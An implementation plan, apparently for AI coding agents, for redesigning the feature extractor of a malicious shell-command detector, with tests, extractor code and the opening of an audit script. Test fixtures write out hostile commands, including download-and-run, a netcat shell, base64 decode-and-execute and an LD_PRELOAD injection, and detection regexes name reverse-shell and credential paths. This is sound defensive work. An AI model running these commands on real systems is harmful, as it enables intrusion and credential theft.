# featurize() Redesign Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Replace Ben's provisional 37-feature `featurize()` with Noam's owned extractor (68 audit candidates), produce per-feature empirical evidence, and finalize the surviving feature set through a joint verdict session.

**Architecture:** `src/features.py` is rewritten in place (same `featurize()` contract, new `FEATURE_NAMES`); a new `analysis/ch3_feature_audit.py` computes signal/shortcut/redundancy evidence on train splits only and writes `results/ch3_feature_audit.json` + `report/ch3_feature_decisions.md` with PROPOSED verdicts; a human checkpoint (Noam) converts proposals to final KEEP/REDEFINE/KILL verdicts, after which the feature set is pruned and re-audited.

**Tech Stack:** Python 3, pandas, numpy, scipy (`mannwhitneyu`, `spearmanr`), scikit-learn (`f1_score`), existing repo pipeline (`src/ingestion.py`, `src/preprocessing.py`, `tests/test_pipeline.py`).

**Spec:** `docs/superpowers/specs/2026-08-08-featurize-redesign-design.md` — the plan implements it 1:1.

## Global Constraints

- Contract frozen: `featurize(commands) -> pd.DataFrame`, `columns == FEATURE_NAMES`, numeric, finite, deterministic, row-independent. `FEATURE_NAMES` is the single authoritative order.
- Error handling per spec: input coerced via `str()`; empty/whitespace-only command → all-zero row; existing no-NaN/inf guard retained.
- `src/preprocessing.py`, `src/models.py`, `src/ingestion.py`, `main.py` are NOT modified. Existing assertions in `tests/test_pipeline.py` are NOT modified; new test functions may be added.
- Audit reads TRAIN splits only, via `ingestion.load(ds)` looping `ingestion.available_datasets()` — never hardcode a dataset name (Dataset Dependency Rule; the guard test bans `dataset1|dataset2` in `src/`, and we extend the same discipline to the new analysis script).
- CSVs are only read through `ingestion` (which already sets `na_filter=False` — dataset 2 contains literal `nan`/`null` commands).
- Survival gate (spec default, adjustable jointly at verdict time): p < 0.01 AND (|Cliff's δ| ≥ 0.1 for continuous, odds ratio ≥ 1.5 or ≤ 1/1.5 for binary) on ≥1 dataset. Redundancy: Spearman |ρ| > 0.9.
- Private IP = RFC1918 (`10.*`, `172.16–31.*`, `192.168.*`) + loopback (`127.*`).
- Verdicts are decided JOINTLY (AI policy): the script emits PROPOSED verdicts; Noam calls each final verdict at the Task 5 checkpoint. Do not skip or auto-complete Task 5.
- `SEED = 42` in the audit script (used by the self-test RNG; everything else is deterministic).
- Every commit message ends with the trailer: `Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>`.
- Run commands with plain `python` from repo root `E:\lotl-shell-detection` (Windows).

## File Structure

| File | Action | Responsibility |
|---|---|---|
| `tests/test_pipeline.py` | Modify (append only) | Two new test functions: input-contract edge cases (Task 1) and behavior-level asserts for fixed/new features (Task 2). Registered in `_all()`. |
| `src/features.py` | Rewrite | Deduped vocabularies, fixed legacy features, families A–D, new 68-entry `FEATURE_NAMES`, dict-based row builder, blank→zero + `str()` coercion. |
| `analysis/ch3_feature_audit.py` | Create | Signal stats, shortcut probes (P8 solo-rule F1, source concentration, retired-P1-marker correlation), Spearman redundancy clusters, proposed verdicts, JSON + markdown outputs. |
| `results/ch3_feature_audit.json` | Generated | Machine-readable evidence per feature × dataset. |
| `report/ch3_feature_decisions.md` | Generated, then hand-finalized | Human-readable per-family verdict table; PROPOSED → final at Task 5. |

---

### Task 1: Input-contract edge-case tests + minimal hardening

**Files:**
- Modify: `tests/test_pipeline.py` (append new function + register in `_all()`)
- Modify: `src/features.py:199-216` (only the `featurize()` function body)

**Interfaces:**
- Consumes: current `featurize` / `FEATURE_NAMES` from `src/features.py`.
- Produces: `test_featurize_edge_cases()` — column-agnostic, so it survives the Task 2 column change unchanged. `featurize()` gains: `str()` coercion of every input, all-zero row for blank input. Signature unchanged.

- [ ] **Step 1: Write the failing test**

Append to `tests/test_pipeline.py` (before `_all()`):

```python
def test_featurize_edge_cases():
    """Input hardening: blanks -> zero rows, str() coercion, unicode/huge
    inputs stay finite and deterministic. Column-agnostic on purpose."""
    blank = featurize(["", "   ", "\t\n"])
    assert (blank.to_numpy(dtype=float) == 0).all(), "blank must be all-zero"
    mixed = featurize([None, 123, float("nan")])  # coerced via str()
    assert np.isfinite(mixed.to_numpy(dtype=float)).all()
    weird = ["nan", "null", "echo \U0001F41A unicode",
             "A" * 10_000, "curl http://x | sh; " * 500]
    w1, w2 = featurize(weird), featurize(weird)
    assert np.isfinite(w1.to_numpy(dtype=float)).all()
    assert w1.equals(w2), "edge inputs must stay deterministic"
    print("ok  featurize edge cases (blank, coercion, unicode, huge)")
```

And add `test_featurize_edge_cases()` as a line inside `_all()` (after `test_featurize_contract()`).

- [ ] **Step 2: Run test to verify it fails**

Run: `python -c "import tests.test_pipeline as t; t.test_featurize_edge_cases()"`
Expected: FAIL — `TypeError` on `None` input (current `_features_for_one` calls `len(None)`), and if that were fixed, the `"   "` row has `len_chars == 3`, violating the all-zero assert.

- [ ] **Step 3: Minimal implementation**

Replace the body of `featurize()` in `src/features.py` (keep the docstring):

```python
def featurize(commands) -> pd.DataFrame:
    """Map raw command strings to the fixed engineered feature matrix.

    Parameters
    ----------
    commands : iterable; each element is coerced via str(). Empty or
        whitespace-only commands produce an all-zero row.

    Returns
    -------
    pandas.DataFrame with columns == FEATURE_NAMES (numeric, one row per input).
    """
    rows = []
    for cmd in commands:
        s = str(cmd)
        if not s.strip():
            rows.append([0] * len(FEATURE_NAMES))
        else:
            rows.append(_features_for_one(s))
    frame = pd.DataFrame(rows, columns=FEATURE_NAMES)
    # sanity: contract is purely numeric, no NaN/inf leaking downstream
    if not np.isfinite(frame.to_numpy(dtype=float)).all():
        raise ValueError("featurize produced non-finite values")
    return frame
```

(The zero row is a plain list here because `_features_for_one` still returns a list; Task 2 switches both to dicts.)

- [ ] **Step 4: Run full suite to verify it passes**

Run: `python tests/test_pipeline.py`
Expected: all existing tests + the new one pass, ending `ALL PIPELINE GUARDRAIL TESTS PASSED`.

- [ ] **Step 5: Commit**

```bash
git add tests/test_pipeline.py src/features.py
git commit -m "test: harden featurize() input contract (blank -> zero row, str coercion)

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>"
```

---

### Task 2: Rewrite `src/features.py` — fixes + families A–D (68 candidates)

**Files:**
- Rewrite: `src/features.py` (full file)
- Modify: `tests/test_pipeline.py` (append behavior test + register in `_all()`)

**Interfaces:**
- Consumes: nothing new (stdlib + numpy/pandas only).
- Produces: `FEATURE_NAMES: list[str]` with exactly 68 entries in the order below; `featurize(commands) -> pd.DataFrame` unchanged in signature. Task 3's audit script imports both. `_features_for_one(s: str) -> dict` (internal). Vocab tuples keep their `_UPPER` names so grep-based review works.

- [ ] **Step 1: Write the failing behavior test**

Append to `tests/test_pipeline.py` (before `_all()`), and add `test_featurize_behaviors()` to `_all()`:

```python
def test_featurize_behaviors():
    """Redesigned features fire on the tradecraft they claim and stay silent
    on the benign look-alikes that broke the provisional versions."""
    F = featurize([
        "sh -c 'id'",                                          # 0
        "grep -e pattern file.txt",                            # 1
        "tar -c -f a.tar dir",                                 # 2
        "nc -lvp 4444 -e /bin/sh",                             # 3
        "curl http://1.2.3.4/x.sh | sh",                       # 4
        "wget http://192.168.1.5/a; echo hi 2>&1 > /dev/null", # 5
        "echo aGk= | base64 -d | bash",                        # 6
        "VAR=1 LD_PRELOAD=/tmp/e.so python3 -c 'x'",           # 7
        'w"h"oami && cat ~/.ssh/authorized_keys',              # 8
        "echo $(cat $(whoami).txt)",                           # 9
        "cat <<EOF > /tmp/x",                                  # 10
    ])
    def f(i, name):
        return F.at[i, name]
    # has_exec_flag: gated on shell/interp/nc, tolerant of intermediate flags
    assert f(0, "has_exec_flag") == 1      # sh -c
    assert f(1, "has_exec_flag") == 0      # grep -e must NOT fire
    assert f(2, "has_exec_flag") == 0      # tar -c must NOT fire
    assert f(3, "has_exec_flag") == 1      # nc ... -e
    # family B micro-structure
    assert f(4, "has_pipe_to_shell") == 1 and f(4, "has_fetch_exec_chain") == 1
    assert f(5, "has_stderr_merge") == 1 and f(5, "has_dev_null") == 1
    assert f(6, "has_decode_exec") == 1
    assert f(10, "has_heredoc") == 1 and f(10, "n_redirect_in") == 0
    # IPv4 private/public split (P8 follow-up)
    assert f(4, "has_public_ip") == 1 and f(4, "has_private_ip") == 0
    assert f(5, "has_private_ip") == 1 and f(5, "has_public_ip") == 0
    # family A head resolution through assignments/wrappers
    assert f(7, "n_assign_prefix") == 2 and f(7, "head_is_interp") == 1
    assert f(7, "has_staging_dir") == 1
    # families C/D
    assert f(8, "has_quote_splice") == 1 and f(8, "n_cred_paths") >= 1
    assert f(8, "has_home_ref") == 1 and f(8, "has_hidden_path") == 1
    assert f(9, "subshell_depth") == 2
    print("ok  featurize behaviors (fixed + A-D families)")
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -c "import tests.test_pipeline as t; t.test_featurize_behaviors()"`
Expected: FAIL — `KeyError` on new column names (e.g. `has_pipe_to_shell`) that don't exist yet.

- [ ] **Step 3: Rewrite `src/features.py`**

Full new file content:

```python
"""
features.py -- engineered feature extractor over raw command text.

OWNERSHIP (docs/WORK_DIVISION.md): `featurize()` is Noam's Ch3 deliverable and
the shared contract every downstream module depends on. Redesigned 2026-08-08
per docs/superpowers/specs/2026-08-08-featurize-redesign-design.md. Per-feature
empirical evidence and KEEP/REDEFINE/KILL verdicts:
results/ch3_feature_audit.json + report/ch3_feature_decisions.md.

Contract (stable -- the column LIST may change, the shape of the API may not):
  * Input: iterable of raw command strings. No dataset identity, no source
    tag. Any element is coerced via str(); empty/whitespace-only -> all-zero
    row.
  * Output: pd.DataFrame, columns == FEATURE_NAMES (authoritative order),
    purely numeric, finite, deterministic, row-independent.
  * Every feature carries a one-line threat rationale (Ch1 mapping source).
  * NO lexical label leakage: labels are provenance-based (DATA_CARD); a
    feature may encode tradecraft structure but never re-derive a selection
    keyword that defines the label. Features overlapping dataset-2's RETIRED
    P1 selection markers are audit-flagged, not banned (P1 is fixed).

Family layout (order of FEATURE_NAMES):
  shape/size -> structure/chaining -> network/delivery -> behavioural binary
  families -> A: head binary & argument shape -> B: rev-shell/download-exec
  micro-structure -> C: path & filesystem -> D: obfuscation & encoding.
"""
from __future__ import annotations

import math
import re
from collections import Counter

import numpy as np
import pandas as pd

# --- token vocabularies grounded in the threat model (proposal section 3) ----
# Deduped 2026-08-08 so each token belongs to exactly ONE counted family and
# Ch4 importances stay attributable: lua -> _INTERP_BINS only; chattr ->
# _EVASION_TOK only; crontab -> _PRIVESC_BINS only (path form stays in the
# legacy lump); "/var/log" redirect strings dropped from _EVASION_TOK (covered
# compositionally by n_log_paths + n_redirect_out).
_FETCH_BINS = ("curl", "wget", "fetch", "tftp", "scp", "ftpget", "nc", "ncat",
               "socat")                    # payload delivery / raw sockets
_SHELL_BINS = ("bash", "sh", "zsh", "dash", "ksh", "ash")  # shell spawn
_INTERP_BINS = ("python", "python2", "python3", "perl", "ruby", "php", "lua",
                "node")                    # scripted payload execution
_LOTL_BINS = ("awk", "gawk", "find", "vim", "vi", "nmap", "tar", "zip", "tee",
              "sed", "ed", "expect", "env", "xargs", "man", "less", "more",
              "busybox", "gdb", "make", "base32")  # GTFOBins-style escapes
_ENUM_BINS = ("whoami", "id", "uname", "hostname", "ifconfig", "ip", "ss",
              "netstat", "ps", "who", "w", "last", "lscpu", "lsb_release",
              "arch", "groups")            # discovery / recon
_PRIVESC_BINS = ("sudo", "su", "chmod", "chown", "setcap", "crontab",
                 "systemctl", "service", "usermod", "useradd", "passwd",
                 "visudo", "doas")         # privilege / persistence
_EVASION_TOK = ("history", "histfile", "unset", "shred", "wipe", "truncate",
                "chattr", "rm -rf", "kill -9")  # anti-forensics
# Legacy lumped list, kept ONLY as the audit baseline against the family-C
# split below; retires if the split covers it (redundancy audit decides).
_SENSITIVE_PATHS = ("/etc/passwd", "/etc/shadow", "/etc/sudoers", "/root/",
                    "/.ssh", "authorized_keys", "id_rsa", "/proc/", "/dev/tcp",
                    "/dev/udp", "/tmp/", "/var/log", "crontab", "/etc/cron")
# Family C vocab
_CRED_PATHS = ("/etc/passwd", "/etc/shadow", "/etc/sudoers", ".ssh",
               "authorized_keys", "id_rsa")     # credential material
_STAGING_DIRS = ("/tmp", "/dev/shm")            # world-writable staging
                                                # ("/var/tmp" contains "/tmp")
# Family A: transparent wrappers skipped when resolving the head binary.
# NOT a counted feature family (parsing aid only), so overlap with the
# families above (sudo, env, busybox) is intentional and leak-free.
_WRAPPER_BINS = ("sudo", "env", "nohup", "time", "busybox")

_WORD_RE = re.compile(r"[A-Za-z0-9_./-]+")
_IPV4_RE = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
_URL_RE = re.compile(r"https?://|ftp://|www\.")
_B64_RE = re.compile(r"[A-Za-z0-9+/]{16,}={0,2}")
_HEX_RE = re.compile(r"\\x[0-9a-fA-F]{2}|0x[0-9a-fA-F]{6,}")
_PORT_RE = re.compile(r":\d{2,5}\b")
_ASSIGN_LEAD_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
_ASSIGN_ANY_RE = re.compile(r"(?:^|[\s;|&(`])[A-Za-z_][A-Za-z0-9_]*=")
_EXPANSION_RE = re.compile(r"\$\{?[A-Za-z_]")   # $VAR / ${VAR}; not $( or $1
_QUOTE_SPLICE_RE = re.compile(r"\w([\"'])[\w${}]*\1\w")   # w"h"oami
_HIDDEN_PATH_RE = re.compile(r"(?:^|[\s/'\"=:])\.[A-Za-z]")  # /.ssh, .bashrc
_DEV_NULL_RE = re.compile(r">\s*/dev/null")
_FLAG_I_RE = re.compile(r"(?:^|\s)-\w*i")
_PIPE_SHELL_RE = re.compile(
    r"\|\s*(?:[\w./-]*/)?(?:bash|sh|zsh|dash|ksh|ash)(?=[\s;&|)]|$)")
_DECODE_RE = re.compile(r"base64\s+(?:-\w+\s+)*-\w*d")
# -c/-e must belong to a shell/interpreter/nc invocation (tolerating that
# binary's own flags/port args in between), so `grep -e` / `tar -c` stay 0.
_EXEC_FLAG_RE = re.compile(
    r"\b(?:bash|sh|zsh|dash|ksh|ash|python[23]?|perl|ruby|php|lua|node"
    r"|nc|ncat)(?:\s+(?:-\w+|\d+))*\s+-\w*[ce](?=\s|$)")


def _shannon_entropy(s: str) -> float:
    if not s:
        return 0.0
    counts = Counter(s)
    n = len(s)
    return -sum((c / n) * math.log2(c / n) for c in counts.values())


def _count_any(low: str, needles) -> int:
    return sum(low.count(n) for n in needles)


def _has_any_token(tokens: set, names) -> int:
    return int(any(n in tokens for n in names))


def _is_private_ip(ip: str) -> bool:
    """RFC1918 + loopback (spec: 10/8, 172.16-31/12, 192.168/16, 127/8)."""
    parts = ip.split(".")
    try:
        a, b = int(parts[0]), int(parts[1])
    except (ValueError, IndexError):
        return False
    return (a == 10 or a == 127 or (a == 192 and b == 168)
            or (a == 172 and 16 <= b <= 31))


def _subshell_depth(s: str) -> int:
    """Max nesting depth of $( ) command substitution."""
    depth = best = i = 0
    while i < len(s):
        if s.startswith("$(", i):
            depth += 1
            best = max(best, depth)
            i += 2
            continue
        if s[i] == ")" and depth:
            depth -= 1
        i += 1
    return best


def _head_and_prefix(tokens_ws) -> tuple:
    """Resolve the first *real* binary: skip VAR=val assignments and
    transparent wrappers (incl. their flags, e.g. `sudo -u root`); busybox
    resolves to its applet. Returns (head_basename_lower, n_assignments)."""
    n_assign = 0
    i = 0
    while i < len(tokens_ws):
        t = tokens_ws[i].strip("'\"`();")
        if _ASSIGN_LEAD_RE.match(t):
            n_assign += 1
            i += 1
            continue
        base = t.rsplit("/", 1)[-1].lower()
        if base in _WRAPPER_BINS:
            i += 1
            while i < len(tokens_ws) and tokens_ws[i].startswith("-"):
                i += 1
            continue
        return base, n_assign
    return "", n_assign


# Authoritative column order. 68 audit candidates; every entry carries its
# threat rationale (Ch1 mapping source). Keep in sync with _features_for_one().
FEATURE_NAMES = [
    # --- shape / size ---
    "len_chars",             # encoded payloads & one-liner chains run long
    "len_tokens",            # enumeration bursts are token-heavy
    "token_entropy",         # scripted loops repeat tokens; recon does not
    "char_entropy",          # encoded blobs push char distribution up
    "mean_token_len",        # long "words" = URLs, blobs, packed payloads
    "max_token_len",         # sharpest single-blob indicator
    # --- structure / chaining ---
    "n_pipes",               # | staging, e.g. fetch | shell
    "n_redirect_out",        # > >> file drop / log truncation (>&-forms excluded)
    "n_redirect_in",         # < stdin feed (heredoc excluded)
    "has_stderr_merge",      # 2>&1 / >& -- interactive rev-shell fingerprint
    "n_semicolons",          # ; chaining / recon bursts
    "n_and_or",              # && || conditional chaining
    "n_backticks_subshell",  # ` and $( -- inline command substitution
    "n_quotes",              # payload wrapping density
    "n_parens",              # code-in-command (awk/python one-liners)
    "n_braces",              # ${} / awk blocks / brace expansion
    # --- network / delivery ---
    "has_ipv4",              # literal IP = no-DNS delivery (P8 audit-flagged)
    "n_ipv4",                # multiple IPs = pivot/scan lists (P8 audit-flagged)
    "has_private_ip",        # RFC1918+loopback: lab/tutorial infrastructure
    "has_public_ip",         # routable literal: real C2 / download host
    "has_url",               # scheme'd URL delivery
    "has_dev_tcp",           # /dev/tcp|udp bash socket = classic reverse shell
    "n_ports",               # :port suffixes (connect-back targets)
    # --- behavioural binary families (presence anywhere in the command) ---
    "has_fetch_bin",         # download/exfil-capable binary present
    "has_shell_bin",         # shell binary named (spawn/pipe target)
    "has_interp_bin",        # interpreter named (scripted payload)
    "has_lotl_bin",          # GTFOBins-style trusted binary present
    "has_enum_bin",          # any discovery binary present
    "n_enum_bins",           # several at once = recon burst
    "has_privesc_bin",       # privilege/persistence binary present
    "has_evasion_tok",       # anti-forensics token present
    # --- A: head binary & argument shape (what actually RUNS, not echoed) ---
    "head_is_fetch",         # command IS a fetch, not just mentions one
    "head_is_shell",         # command IS a shell invocation
    "head_is_interp",        # command IS interpreter execution (python -c ...)
    "head_is_lotl",          # command IS a GTFOBins binary invocation
    "head_is_enum",          # command IS discovery
    "head_is_privesc",       # command IS a privilege/persistence action
    "n_flags",               # option density; tool abuse is flag-heavy
    "has_long_flag",         # --word flags skew benign/tutorial style
    "n_assign_prefix",       # VAR=x cmd -- env-injection (LD_PRELOAD=...)
    # --- B: rev-shell / download-exec micro-structure (proposal section 3) ---
    "has_pipe_to_shell",     # | sh/bash -- execute whatever arrived
    "has_fetch_exec_chain",  # fetch bin AND pipe-to-shell = download-exec
    "has_decode_exec",       # base64 -d in a pipe = decode-then-run
    "has_ifs_expansion",     # ${IFS} whitespace evasion
    "has_heredoc",           # << inline payload delivery
    "has_dev_null",          # >/dev/null output suppression
    "has_shell_flag_i",      # -i + shell bin = interactive (reverse) shell
    "has_exec_flag",         # sh -c / python -c / nc -e execution flag (gated)
    # --- C: path & filesystem (split of the legacy lump) ---
    "n_abs_paths",           # absolute-path tokens: explicit fs targeting
    "has_hidden_path",       # dot-dirs (/.ssh, .bashrc) = stealth/persistence
    "has_staging_dir",       # /tmp, /var/tmp, /dev/shm payload staging
    "has_home_ref",          # ~ / $HOME targeting user artifacts
    "n_cred_paths",          # passwd/shadow/sudoers/.ssh/id_rsa credential refs
    "n_proc_paths",          # /proc/ introspection & runtime tampering
    "n_log_paths",           # /var/log tampering target
    "n_sensitive_paths",     # LEGACY lump (audit: retire if C-split covers it)
    # --- D: obfuscation & encoding depth ---
    "has_base64_blob",       # long base64 run = encoded payload
    "b64_run_len",           # longest base64-ish run
    "has_hex_escape",        # \xNN / long 0x literals = binary payload in text
    "has_eval",              # eval = execute constructed string
    "nonprintable_ratio",    # raw bytes in "text" command
    "digit_ratio",           # IPs/ports/encodings push digits up
    "special_ratio",         # symbol density (ShellCore char-level insight)
    "n_var_assignments",     # VAR= anywhere: staging values for later expansion
    "n_var_expansions",      # $VAR/${..}: indirection hiding intent
    "has_quote_splice",      # w"h"oami -- quote-splice keyword obfuscation
    "n_backslash",           # escape density (obfuscation / encoded payloads)
    "subshell_depth",        # nested $( ) = layered construction
]

assert len(FEATURE_NAMES) == len(set(FEATURE_NAMES)) == 68


def _features_for_one(s: str) -> dict:
    low = s.lower()
    tokens = _WORD_RE.findall(low)
    # membership set includes path basenames so `/bin/sh` registers as `sh`
    token_set = set(tokens)
    token_set.update(t.rsplit("/", 1)[-1] for t in tokens if "/" in t)
    tokens_ws = s.split()
    n_chars = len(s)
    n_tokens = len(tokens)

    tok_lens = [len(t) for t in tokens] or [0]
    if tokens:
        tc = Counter(tokens)
        tok_entropy = -sum((c / n_tokens) * math.log2(c / n_tokens)
                           for c in tc.values())
    else:
        tok_entropy = 0.0

    ips = _IPV4_RE.findall(s)
    b64_runs = _B64_RE.findall(s)
    b64_run_len = max((len(b) for b in b64_runs), default=0)
    nonprintable = sum(1 for ch in s if ord(ch) < 32 or ord(ch) > 126)
    digits = sum(ch.isdigit() for ch in s)
    specials = sum((not ch.isalnum()) and (not ch.isspace()) for ch in s)
    n_enum = sum(1 for b in _ENUM_BINS if b in token_set)

    # redirects: strip stderr-merge forms first so 2>&1 / >& count once, as
    # their own feature; strip << so heredocs don't count as stdin redirects
    s_no_merge = s.replace("2>&1", "").replace(">&", "")
    n_redirect_out = len(re.findall(r">{1,2}", s_no_merge))
    n_redirect_in = s.replace("<<", "").count("<")
    has_stderr_merge = int("2>&1" in s or ">&" in s)

    head, n_assign_prefix = _head_and_prefix(tokens_ws)
    has_fetch = _has_any_token(token_set, _FETCH_BINS)
    has_pipe_to_shell = int(bool(_PIPE_SHELL_RE.search(low)))

    return {
        # shape / size
        "len_chars": n_chars,
        "len_tokens": n_tokens,
        "token_entropy": round(tok_entropy, 6),
        "char_entropy": round(_shannon_entropy(s), 6),
        "mean_token_len": round(float(np.mean(tok_lens)), 6),
        "max_token_len": max(tok_lens),
        # structure / chaining
        "n_pipes": low.count("|"),
        "n_redirect_out": n_redirect_out,
        "n_redirect_in": n_redirect_in,
        "has_stderr_merge": has_stderr_merge,
        "n_semicolons": s.count(";"),
        "n_and_or": low.count("&&") + low.count("||"),
        "n_backticks_subshell": s.count("`") + s.count("$("),
        "n_quotes": s.count('"') + s.count("'"),
        "n_parens": s.count("(") + s.count(")"),
        "n_braces": s.count("{") + s.count("}"),
        # network / delivery
        "has_ipv4": int(bool(ips)),
        "n_ipv4": len(ips),
        "has_private_ip": int(any(_is_private_ip(ip) for ip in ips)),
        "has_public_ip": int(any(not _is_private_ip(ip) for ip in ips)),
        "has_url": int(bool(_URL_RE.search(low))),
        "has_dev_tcp": int("/dev/tcp" in low or "/dev/udp" in low),
        "n_ports": len(_PORT_RE.findall(s)),
        # behavioural binary families
        "has_fetch_bin": has_fetch,
        "has_shell_bin": _has_any_token(token_set, _SHELL_BINS),
        "has_interp_bin": _has_any_token(token_set, _INTERP_BINS),
        "has_lotl_bin": _has_any_token(token_set, _LOTL_BINS),
        "has_enum_bin": int(n_enum > 0),
        "n_enum_bins": n_enum,
        "has_privesc_bin": _has_any_token(token_set, _PRIVESC_BINS),
        "has_evasion_tok": int(_count_any(low, _EVASION_TOK) > 0),
        # A: head binary & argument shape
        "head_is_fetch": int(head in _FETCH_BINS),
        "head_is_shell": int(head in _SHELL_BINS),
        "head_is_interp": int(head in _INTERP_BINS),
        "head_is_lotl": int(head in _LOTL_BINS),
        "head_is_enum": int(head in _ENUM_BINS),
        "head_is_privesc": int(head in _PRIVESC_BINS),
        "n_flags": sum(1 for t in tokens_ws
                       if t.startswith("-") and len(t) > 1),
        "has_long_flag": int(any(t.startswith("--") and len(t) > 2
                                 for t in tokens_ws)),
        "n_assign_prefix": n_assign_prefix,
        # B: rev-shell / download-exec micro-structure
        "has_pipe_to_shell": has_pipe_to_shell,
        "has_fetch_exec_chain": int(bool(has_fetch) and
                                    bool(has_pipe_to_shell)),
        "has_decode_exec": int(bool(_DECODE_RE.search(low)) and "|" in s),
        "has_ifs_expansion": int("${ifs}" in low),
        "has_heredoc": int("<<" in s),
        "has_dev_null": int(bool(_DEV_NULL_RE.search(low))),
        "has_shell_flag_i": int(bool(_FLAG_I_RE.search(low)) and
                                _has_any_token(token_set, _SHELL_BINS)),
        "has_exec_flag": int(bool(_EXEC_FLAG_RE.search(low))),
        # C: path & filesystem
        "n_abs_paths": sum(1 for t in tokens_ws if t.startswith("/")),
        "has_hidden_path": int(bool(_HIDDEN_PATH_RE.search(s))),
        "has_staging_dir": int(any(p in low for p in _STAGING_DIRS)),
        "has_home_ref": int("~" in s or "$home" in low),
        "n_cred_paths": _count_any(low, _CRED_PATHS),
        "n_proc_paths": low.count("/proc/"),
        "n_log_paths": low.count("/var/log"),
        "n_sensitive_paths": _count_any(low, _SENSITIVE_PATHS),
        # D: obfuscation & encoding depth
        "has_base64_blob": int(b64_run_len >= 20),
        "b64_run_len": b64_run_len,
        "has_hex_escape": int(bool(_HEX_RE.search(s))),
        "has_eval": int("eval" in token_set),
        "nonprintable_ratio": round(nonprintable / n_chars, 6),
        "digit_ratio": round(digits / n_chars, 6),
        "special_ratio": round(specials / n_chars, 6),
        "n_var_assignments": len(_ASSIGN_ANY_RE.findall(s)),
        "n_var_expansions": len(_EXPANSION_RE.findall(s)),
        "has_quote_splice": int(bool(_QUOTE_SPLICE_RE.search(s))),
        "n_backslash": s.count("\\"),
        "subshell_depth": _subshell_depth(s),
    }


def featurize(commands) -> pd.DataFrame:
    """Map raw command strings to the fixed engineered feature matrix.

    Parameters
    ----------
    commands : iterable; each element is coerced via str(). Empty or
        whitespace-only commands produce an all-zero row.

    Returns
    -------
    pandas.DataFrame with columns == FEATURE_NAMES (numeric, one row per input).
    """
    rows = []
    for cmd in commands:
        s = str(cmd)
        if not s.strip():
            rows.append(dict.fromkeys(FEATURE_NAMES, 0))
        else:
            rows.append(_features_for_one(s))
    frame = pd.DataFrame(rows, columns=FEATURE_NAMES)
    # sanity: contract is purely numeric, no NaN/inf leaking downstream
    # (a dict missing a FEATURE_NAMES key surfaces here as NaN)
    if not np.isfinite(frame.to_numpy(dtype=float)).all():
        raise ValueError("featurize produced non-finite values")
    return frame
```

Division-guard note: `_features_for_one` is only called with `s.strip()` truthy, so `n_chars >= 1` and the ratio divisions are safe; the blank case returns the zero dict in `featurize`.

- [ ] **Step 4: Run the full suite**

Run: `python tests/test_pipeline.py`
Expected: PASS all five tests (contract test is column-agnostic; edge-case test from Task 1 unchanged; new behavior test green).

- [ ] **Step 5: Smoke the downstream pipeline**

Run: `python main.py holdout --model random_forest --dataset dataset1`
Expected: completes end-to-end and prints holdout metrics (values will differ from Ben's — that's the point; downstream re-runs are Task 6's hand-off).

- [ ] **Step 6: Commit**

```bash
git add src/features.py tests/test_pipeline.py
git commit -m "feat: redesign featurize() -- deduped vocabularies, fixed features, families A-D (68 candidates)

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>"
```

---

### Task 3: Write `analysis/ch3_feature_audit.py`

**Files:**
- Create: `analysis/ch3_feature_audit.py`

**Interfaces:**
- Consumes: `src.ingestion.available_datasets()` / `load(ds) -> (train_df, test_df)` with columns `command,label,source`; `src.features.FEATURE_NAMES`, `featurize`.
- Produces: running the script writes `results/ch3_feature_audit.json` and `report/ch3_feature_decisions.md`. JSON top-level keys: `"gate"`, `"datasets"`, `"p8_ipv4_solo_f1"`, `"retired_marker_prevalence"`, `"clusters"`, `"per_feature"`. Per-feature keys: `family, binary, per_dataset (ds -> {mean_mal, mean_ben, median_mal, median_ben, mwu_p, effect_type, effect, auc, solo_rule_f1, source_concentration, retired_marker_rho, passes_gate, dead}), passes_gate_any, cluster, is_representative, flags, proposed_verdict`.

- [ ] **Step 1: Write the script**

Full file content:

```python
"""
ch3_feature_audit.py -- evidence + verdict scaffolding for every engineered
feature (Noam's Ch3 deliverable; Ch4 shortcut probes included).

Per feature x per dataset (TRAIN SPLITS ONLY, via src.ingestion):

  signal     class-conditional mean/median; Mann-Whitney U p; effect size --
             Cliff's delta for continuous features (identical to the
             rank-biserial 2U/(n1*n2)-1, computed from scipy's U in
             O(n log n)) or Haldane-corrected odds ratio for binary features;
             per-feature AUC = U/(n1*n2).
  shortcut   solo-rule F1 (predict attack iff value > 0) vs the do-nothing
             floor 2p/(1+p) -- the KNOWN_ISSUES P8 probe generalized to every
             feature; source concentration (share of feature-positive attack
             rows owned by a single source: a fingerprint, not a behaviour);
             Spearman rho vs dataset 2's RETIRED P1 selection markers
             (echoing a retired marker is flagged, not disqualifying).
  redundancy Spearman clusters at |rho| > RHO_MAX (edges pooled across
             datasets); one representative per cluster proposed by mean
             |AUC - 0.5|.

Survival gate (spec default; adjustable jointly at verdict time):
  p < ALPHA AND (|delta| >= DELTA_MIN or OR >= OR_HI or OR <= OR_LO)
  on >= 1 dataset.

Verdicts emitted here are PROPOSED ONLY. Final KEEP/REDEFINE/KILL calls are
made jointly (course AI policy) and recorded in
report/ch3_feature_decisions.md.

Run: python analysis/ch3_feature_audit.py
Outputs: results/ch3_feature_audit.json, report/ch3_feature_decisions.md
"""
from __future__ import annotations

import json
import sys
from pathlib import Path

import numpy as np
import pandas as pd
from scipy.stats import mannwhitneyu, spearmanr
from sklearn.metrics import f1_score

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
from src import ingestion                              # noqa: E402
from src.features import FEATURE_NAMES, featurize      # noqa: E402

SEED = 42
ALPHA = 0.01          # significance gate
DELTA_MIN = 0.10      # |Cliff's delta| gate, continuous features
OR_HI = 1.5           # odds-ratio gate, binary features
OR_LO = 1.0 / 1.5
RHO_MAX = 0.90        # Spearman redundancy threshold
CONC_FLAG = 0.90      # source-concentration flag level
SOLO_F1_FLAG = 0.85   # solo-rule F1 flag level (P8 IPv4 scores ~0.94 on D1)
MARKER_RHO_FLAG = 0.50

RESULTS = ROOT / "results"
REPORT = ROOT / "report"

